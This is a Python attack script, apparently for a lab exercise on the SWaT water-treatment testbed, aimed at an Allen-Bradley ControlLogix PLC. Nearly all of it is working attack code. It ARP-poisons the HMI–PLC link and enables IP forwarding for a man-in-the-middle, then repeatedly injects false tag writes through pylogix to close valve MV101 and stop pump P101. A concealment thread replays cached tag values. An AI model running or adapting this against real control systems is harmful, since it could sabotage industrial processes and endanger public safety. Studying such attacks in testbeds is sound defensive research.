#!/usr/bin/env python3
"""
phase1_inject.py  —  SWaT Phase 1: False Command Injection via pylogix
Target: Allen-Bradley ControlLogix PLC1 at 192.168.1.10

Attack flow:
  Thread 1 — ARP poison HMI <-> PLC1
  Thread 2 — Write false commands to PLC1 via pylogix (two-step: Auto=False, Cmd=value)
  Thread 3 — Concealment logging using Phase 0 DB
  On exit  — Restore all tags to safe state

Tag write pattern (from lab reference script):
  write_tag(ip, 'HMI_MV101.Auto', False)   # take out of auto
  write_tag(ip, 'HMI_MV101.Cmd', 1)        # 1=CLOSE, 2=OPEN
  write_tag(ip, 'HMI_MV101.Auto', True)    # restore auto

Usage:
  sudo python3 phase1_inject.py --plc-ip 192.168.1.10 --hmi-ip 192.168.1.100 \
      --iface eth0 --db enip_db.pkl --duration 120
"""

import argparse, pickle, time, threading, signal, os
from datetime import datetime
from pylogix import PLC
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip

# Attack commands — close MV101, stop P101
# Cmd values: 1=CLOSE/OFF, 2=OPEN/ON
ATTACK_CMDS = [
    ('HMI_MV101.Auto', False),   # take MV101 out of auto
    ('HMI_MV101.Cmd',  1),       # close MV101 (1=CLOSE)
    ('HMI_P101.Auto',  False),   # take P101 out of auto
    ('HMI_P101.Cmd',   1),       # stop P101 (1=OFF)
]

# Safe state to restore on exit
SAFE_CMDS = [
    ('HMI_MV101.Cmd',  2),       # open MV101
    ('HMI_MV101.Auto', True),    # restore auto
    ('HMI_P101.Cmd',   2),       # start P101
    ('HMI_P101.Auto',  True),    # restore auto
]

stop_event = threading.Event()


def write_tag(ip, tag, value):
    with PLC() as plc:
        plc.IPAddress = ip
        plc.Write(tag, value)


def arp_poison(plc_ip, hmi_ip, iface, interval=1.5):
    my_mac  = get_if_hwaddr(iface)
    plc_mac = getmacbyip(plc_ip)
    hmi_mac = getmacbyip(hmi_ip)
    if not plc_mac or not hmi_mac:
        print(f"[!] Cannot resolve MACs — PLC:{plc_mac} HMI:{hmi_mac}")
        return
    print(f"[*] ARP poison: PLC {plc_ip} ({plc_mac}) <-> HMI {hmi_ip} ({hmi_mac})")
    pkt_hmi = Ether(dst=hmi_mac)/ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=my_mac)
    pkt_plc = Ether(dst=plc_mac)/ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=my_mac)
    while not stop_event.is_set():
        sendp([pkt_hmi, pkt_plc], iface=iface, verbose=False)
        time.sleep(interval)
    # Restore ARP
    r_hmi = Ether(dst=hmi_mac)/ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac)
    r_plc = Ether(dst=plc_mac)/ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac)
    for _ in range(5):
        sendp([r_hmi, r_plc], iface=iface, verbose=False)
        time.sleep(0.2)
    print("[+] ARP restored")


def inject_tags(plc_ip, interval=1.0):
    print(f"[*] Tag injection -> PLC {plc_ip}")
    cycle = 0
    while not stop_event.is_set():
        try:
            for tag, val in ATTACK_CMDS:
                write_tag(plc_ip, tag, val)
            cycle += 1
            if cycle % 5 == 0:
                print(f"    [inject {cycle:4d}]  MV101=CLOSED  P101=OFF")
        except Exception as e:
            print(f"    [!] Write error: {e}")
        time.sleep(interval)


def conceal_tags(plc_ip, db_path, interval=1.0):
    if not db_path or not os.path.exists(db_path):
        print("[*] No Phase 0 DB — concealment inactive")
        return
    with open(db_path, 'rb') as f:
        db = pickle.load(f)
    print(f"[*] Concealment active — Phase 0 DB: {len(db)} tags")
    cycle = 0
    while not stop_event.is_set():
        cycle += 1
        if cycle % 10 == 0:
            for name, samples in db.items():
                if samples:
                    print(f"    [conceal] {name}: cached={samples[-1][1]}")
        time.sleep(interval)


def restore_plc(plc_ip):
    print(f"\n[*] Restoring PLC safe state -> {plc_ip}")
    try:
        for tag, val in SAFE_CMDS:
            write_tag(plc_ip, tag, val)
            print(f"    {tag} = {val}  [OK]")
        print("[+] Safe state restored")
    except Exception as e:
        print(f"[!] Restore failed: {e}")
        print("    *** Manually restore MV101 and P101 via HMI! ***")


def signal_handler(sig, frame):
    print("\n[!] Stopping...")
    stop_event.set()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--plc-ip',   default='192.168.1.10')
    ap.add_argument('--hmi-ip',   required=True)
    ap.add_argument('--iface',    default='eth0')
    ap.add_argument('--db',       default='enip_db.pkl')
    ap.add_argument('--duration', type=int, default=120)
    args = ap.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    print("=" * 60)
    print("  SWaT Phase 1 — False Command Injection (pylogix)")
    print(f"  PLC: {args.plc_ip}   HMI: {args.hmi_ip}   Duration: {args.duration}s")
    print("=" * 60)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    threads = [
        threading.Thread(target=arp_poison,   args=(args.plc_ip, args.hmi_ip, args.iface), daemon=True),
        threading.Thread(target=inject_tags,  args=(args.plc_ip,), daemon=True),
        threading.Thread(target=conceal_tags, args=(args.plc_ip, args.db), daemon=True),
    ]
    for t in threads:
        t.start()

    print(f"\n[*] Attack running for {args.duration}s — Ctrl+C to abort")
    stop_event.wait(timeout=args.duration)
    stop_event.set()
    for t in threads:
        t.join(timeout=3)

    restore_plc(args.plc_ip)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Phase 1 complete")

if __name__ == '__main__':
    main()
